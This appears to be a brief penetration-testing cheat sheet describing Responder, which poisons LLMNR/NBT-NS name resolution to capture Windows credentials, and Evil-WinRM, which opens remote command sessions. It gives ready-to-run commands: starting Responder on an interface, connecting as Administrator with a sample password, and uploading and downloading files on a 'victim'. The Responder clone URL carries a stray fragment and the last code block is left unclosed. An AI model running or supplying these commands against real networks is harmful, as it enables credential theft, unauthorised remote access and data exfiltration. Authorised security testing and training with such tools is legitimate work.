# Responder
Responder is a tool for poisoning the LLMNR and NBT-NS protocols on a network, to allow for credential capture and arbitrary code execution.

The LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) protocols are used by Windows systems to resolve hostnames to IP addresses on a local network. If a hostname cannot be resolved using these protocols, the system will broadcast a request for the hostname to the local network.

Responder listens for these broadcasts and responds with a fake IP address, tricking the requesting system into sending its credentials to the attacker.
```bash
git clone https://github.com/SpiderLabs/Responder#usage
./Responder.py -I eth0
```

# Evil-WinRM 
allows an attacker to remotely connect to a Windows machine using WinRM and execute arbitrary commands.
```bash
sudo gem install winrm winrm-fs stringio logger fileutils
git clone https://github.com/Hackplayers/evil-winrm.git

# Connect to 192.168.1.100 as Administrator with custom exe/ps1 download folder locations
evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'

# Upload local files to victim
upload local_filename
upload local_filename destination_filename

# Download remote files to local machine
download remote_filename
download remote_filename destination_filename
